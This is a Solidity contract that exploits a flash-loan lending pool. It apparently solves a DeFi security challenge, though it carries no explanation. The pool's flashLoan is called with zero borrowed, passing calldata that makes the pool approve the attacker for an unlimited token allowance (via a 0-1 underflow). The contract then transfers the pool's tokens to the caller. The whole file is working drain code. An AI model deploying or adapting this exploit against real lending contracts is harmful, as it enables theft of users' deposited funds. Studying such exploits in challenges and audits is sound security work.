pragma solidity ^0.6.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface TrustedLenderPool {
    function flashLoan(
        uint256 borrowAmount,
        address borrower,
        address target,
        bytes calldata data
    ) external;
}

contract TrustedLenderExploit {
    function exploit(address _pool, address _token, uint256 _amount) external {
        TrustedLenderPool pool = TrustedLenderPool(_pool);
        // Thanks to https://medium.com/coinmonks/delegatecall-calling-another-contract-function-in-solidity-b579f804178c
        bytes memory approval = abi.encodeWithSignature("approve(address,uint256)", address(this), 0-1);
        pool.flashLoan(0, address(this), _token, approval);
        IERC20 token = IERC20(_token);
        token.transferFrom(_pool, msg.sender, _amount);
    }
}